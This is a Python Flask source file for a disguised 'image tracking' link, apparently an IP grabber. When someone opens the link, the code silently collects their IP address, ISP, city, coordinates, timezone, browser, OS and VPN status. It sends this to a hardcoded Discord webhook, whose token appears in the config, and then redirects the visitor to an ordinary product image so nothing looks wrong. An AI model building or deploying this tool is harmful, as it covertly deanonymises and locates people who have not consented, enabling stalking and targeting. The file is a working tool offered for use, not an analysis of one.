from flask import Flask, request, redirect
import requests
import httpagentparser
import json
from datetime import datetime

app = Flask(__name__)

CONFIG = {
    "image_url": "https://m.media-amazon.com/images/I/813kqvYoRfL.png",
    "discord_webhook": "https://discord.com/api/webhooks/1417819830777675826/XgDDma1Cu14TNEtRpMZJYjZT2Uo3xs0SkLMQ1pQ61H9SQ-rL93TGGI4HzXWOrJAT2RjI",
    "ip_api_url": "http://ip-api.com/json/{}?fields=66846719"
}

def get_ip_info(ip):
    try:
        response = requests.get(CONFIG["ip_api_url"].format(ip), timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def send_to_discord(visitor_data):
    try:
        embed = {
            "title": "🔍 New Visitor Detected",
            "color": 0x5865F2,
            "fields": [
                {
                    "name": "🌐 Network Information",
                    "value": f"**IP:** `{visitor_data['ip']}`\n"
                             f"**ISP:** {visitor_data['isp']}\n"
                             f"**ASN:** {visitor_data['asn']}",
                    "inline": False
                },
                {
                    "name": "📍 Location",
                    "value": f"**Country:** {visitor_data['country']}\n"
                             f"**Region:** {visitor_data['region']}\n"
                             f"**City:** {visitor_data['city']}\n"
                             f"**Coordinates:** {visitor_data['lat']}, {visitor_data['long']}\n"
                             f"**Timezone:** {visitor_data['timezone']}",
                    "inline": False
                },
                {
                    "name": "🖥️ Device Information",
                    "value": f"**Browser:** {visitor_data['browser']}\n"
                             f"**OS:** {visitor_data['os']}\n"
                             f"**Mobile:** {visitor_data['mobile']}",
                    "inline": True
                },
                {
                    "name": "🔒 Security",
                    "value": f"**VPN:** {visitor_data['vpn']}\n"
                             f"**Bot:** {visitor_data['bot']}",
                    "inline": True
                }
            ],
            "footer": {
                "text": f"Tracked at {visitor_data['timestamp']}"
            },
            "thumbnail": {
                "url": CONFIG["image_url"]
            }
        }
        
        payload = {
            "embeds": [embed]
        }
        
        requests.post(CONFIG["discord_webhook"], json=payload, timeout=5)
    except Exception as e:
        print(f"Error sending to Discord: {e}")

def format_timezone(timezone_str):
    try:
        parts = timezone_str.split('/')
        if len(parts) >= 2:
            return f"{parts[1].replace('_', ' ')} ({parts[0]})"
        return timezone_str
    except:
        return "Unknown"

@app.route('/api/image')
def track_image():
    ip = request.headers.get('x-forwarded-for', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()

    ip_data = get_ip_info(ip)

    user_agent = request.headers.get('user-agent', 'Unknown')
    try:
        ua_parsed = httpagentparser.simple_detect(user_agent)
        browser = ua_parsed[1] if len(ua_parsed) > 1 else 'Unknown'
        os = ua_parsed[0] if len(ua_parsed) > 0 else 'Unknown'
    except:
        browser = 'Unknown'
        os = 'Unknown'

    visitor_data = {
        "ip": ip,
        "isp": ip_data.get("isp", "Unknown") if ip_data else "Unknown",
        "asn": ip_data.get("as", "Unknown") if ip_data else "Unknown",
        "country": ip_data.get("country", "Unknown") if ip_data else "Unknown",
        "region": ip_data.get("regionName", "Unknown") if ip_data else "Unknown",
        "city": ip_data.get("city", "Unknown") if ip_data else "Unknown",
        "lat": str(ip_data.get("lat", "0")) if ip_data else "0",
        "long": str(ip_data.get("lon", "0")) if ip_data else "0",
        "timezone": format_timezone(ip_data.get("timezone", "Unknown")) if ip_data else "Unknown",
        "mobile": str(ip_data.get("mobile", False)) if ip_data else "False",
        "vpn": str(ip_data.get("proxy", False)) if ip_data else "False",
        "bot": str(ip_data.get("hosting", False) if ip_data and ip_data.get("hosting") and not ip_data.get("proxy") else 'Possibly' if ip_data and ip_data.get("hosting") else 'False'),
        "browser": browser,
        "os": os,
        "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    }

    try:
        send_to_discord(visitor_data)
    except Exception as e:
        print(f"Failed to send Discord notification: {e}")

    return redirect(CONFIG["image_url"])

@app.route('/')
def home():
    """Root endpoint"""
    return {"status": "ok", "message": "Image tracking API is running"}

def handler(request):
    with app.request_context(request.environ):
        return app.full_dispatch_request()